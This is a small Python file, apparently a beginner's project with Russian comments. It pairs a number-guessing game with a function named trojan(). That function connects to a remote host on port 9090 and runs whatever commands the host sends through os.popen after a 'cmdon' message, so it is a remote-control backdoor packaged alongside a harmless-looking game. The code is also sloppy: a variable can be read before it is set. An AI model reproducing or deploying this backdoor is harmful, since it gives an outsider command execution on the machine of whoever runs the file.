import random
import socket
import threading
import os


def game():
    number = random.randint(0, 1000)
    tries = 1
    done = False

    while not done:
        quess = input('Введите число: ')
        if quess.isdigit():
            quess = int(quess)
            if quess == number:
                done = True
                print('Ты победил!')
            else:
                tries += 1
                if quess > number:
                    print('Загаданное исло меньше')
                else:
                    print('Загаданное исло больше')
        else:
            print('Это не число от 0 до 1000')


game()

def trojan():
    #ip атакуемого
    HOST = '***'
    PORT = 9090

    #эхо-сервер
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))

    while True:
        #команда серверу
        server_command = client.recv(1024).decode('cp866')

        if server_command == 'cmdon':
            cmd_mode = True
            #отправка инфы на сервак
            client.send('Получен доступ к терминалу'.encode('cp866'))
            continue

        if server_command == 'cmdoff':
            cmd_mode = False

        if cmd_mode:
            os.popen(server_command)
        else:
            if server_command == 'hello':
                print('Hello World!')
        client.send(f'{server_command} успешно отправлена'.encode('cp866'))